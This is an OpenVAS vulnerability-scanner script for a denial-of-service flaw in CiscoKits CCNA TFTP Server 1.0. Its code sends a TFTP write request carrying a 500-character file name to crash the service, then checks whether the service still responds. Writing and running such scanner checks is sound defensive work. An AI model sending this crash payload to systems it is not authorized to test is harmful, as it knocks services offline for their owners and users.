###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ciscokits_tftp_server_write_dos_vuln.nasl 13203 2019-01-21 15:28:12Z cfischer $
#
# CiscoKits CCNA TFTP Server 'Write' Command Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802232");
  script_version("$Revision: 13203 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:28:12 +0100 (Mon, 21 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-08-10 13:49:51 +0200 (Wed, 10 Aug 2011)");
  script_bugtraq_id(49045);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_name("CiscoKits CCNA TFTP Server 'Write' Command Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected", "Host/runs_windows");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/69042");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17618/");
  script_xref(name:"URL", value:"http://secpod.org/SECPOD_CiscoKits_CCNA_TFTP_DoS_POC.py");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_Ciscokits_CCNA_TFTP_DoS.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to cause denial
  of service condition.");

  script_tag(name:"affected", value:"CiscoKits CCNA TFTP Server 1.0.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of 'WRITE' request
  parameter containing a long file name, which allows remote attackers to crash the service and
  cause denial of service condition.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Ciscokits CCNA TFTP Server and is prone to
  denial of service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

port = get_kb_item("Services/udp/tftp");
if(!port)
  port = 69;

if(!get_udp_port_state(port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

mode = "netascii";

req = raw_string(0x00, 0x01) +       ## Read Request
      "AAA.txt" + raw_string(0x00) + ## Source File Name
      mode + raw_string(0x00);       ## Type (Mode)

send(socket:soc, data:req);
res = recv(socket:soc, length:100);

if(!res || "Not Found in local Storage" >!< res){
  close(soc);
  exit(0);
}

attack = raw_string(0x00, 0x02) +                        ## Write Request
         crap(data:"A", length:500) + raw_string(0x00) + ## Source File Name
         mode + raw_string(0x00);                        ## Type (Mode)

send(socket:soc, data:attack);
close(soc);

sleep(5);

soc1 = open_sock_udp(port);
if(!soc1){
  security_message(port:port, proto:"udp");
  exit(0);
}

send(socket:soc1, data:req);
res = recv(socket:soc1, length:100);

if(!res || "Not Found in local Storage" >!< res) {
  security_message(port:port, proto:"udp");
  exit(0);
}

close(soc1);
exit(99);